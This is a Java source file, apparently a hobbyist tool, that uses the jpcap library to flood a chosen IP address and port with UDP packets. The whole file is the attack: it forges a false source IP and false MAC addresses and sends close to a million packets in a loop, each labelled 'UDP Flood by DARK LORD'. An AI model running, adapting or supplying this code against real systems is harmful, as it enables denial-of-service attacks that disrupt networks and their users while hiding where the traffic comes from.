/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package dos;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.SocketException;
import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.EthernetPacket;
import jpcap.packet.IPPacket;
import jpcap.packet.UDPPacket;

/**
 *
 * @author SiyaRam
 */
public class UDP_DOS implements Runnable {

    //private DatagramSocket socket;
    //private DatagramPacket packet;
    private String port;
    private String fakeip = "10.100.11.12";
    private String ip;
    NetworkInterface[] devices = null;
    JpcapSender sender = null;

    public UDP_DOS(String ip, String port) {
        this.port = port;
        this.ip = ip;
        JpcapCaptor.getDeviceList();
        try {
            //socket = new DatagramSocket();
            int index = 2;
            devices = JpcapCaptor.getDeviceList();
            sender = JpcapSender.openDevice(devices[index]);
        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }

    @Override
    public void run() {
        for (int i = 1; i < 1000000; i++) {



            //String msg = "Hello victim";
//            try {
//                System.out.println(this.ip);
//                packet = new DatagramPacket(msg.getBytes(), msg.length(), InetAddress.getByName(this.ip), Integer.parseInt(this.port));
//                socket.send(packet);
//                System.out.println("Current Connection: " + i);
//            } catch (IOException ex) {
//                ex.printStackTrace();
//            }         

            try {

                //all device interfaces
//                for (int j = 0; j < devices.length; j++) {
//                    System.out.println(j + ":" + devices[j].name + "(" + devices[j].description + ")");
//                }

                //1st source 2nd dest port
                UDPPacket p = new UDPPacket(12345, Integer.parseInt(this.port));

                //d_flag - IP flag bit: [D]elay
                //t_flag - IP flag bit: [T]hrough
                //r_flag - IP flag bit: [R]eliability
                //rsv_tos - Type of Service (TOS)
                //priority - Priority
                //rsv_frag - Fragmentation Reservation flag
                //dont_frag - Don't fragment flag
                //more_frag - More fragment flag
                //offset - Offset
                //ident - Identifier
                //ttl - Time To Live
                //protocol - Protocol 
                //This value is ignored when this packets inherits a higher layer protocol(e.g. TCPPacket)
                //src - Source IP address
                //dst - Destination IP address

                p.setIPv4Parameter(0, false, false, false, 0, false, false, false, 0, 1010101, 100, IPPacket.IPPROTO_UDP,
                        InetAddress.getByName(fakeip), InetAddress.getByName(this.ip));
                p.data = "Hello This is UDP Flood by DARK LORD".getBytes();

                EthernetPacket ether = new EthernetPacket();
                ether.frametype = EthernetPacket.ETHERTYPE_IP;
                ether.src_mac = new byte[]{(byte) 0, (byte) 1, (byte) 2, (byte) 3, (byte) 4, (byte) 5};
                ether.dst_mac = new byte[]{(byte) 0, (byte) 6, (byte) 7, (byte) 8, (byte) 9, (byte) 10};
                p.datalink = ether;

                sender.sendPacket(p);

            } catch (IOException ex) {
                ex.printStackTrace();
            }

        }
    }
}
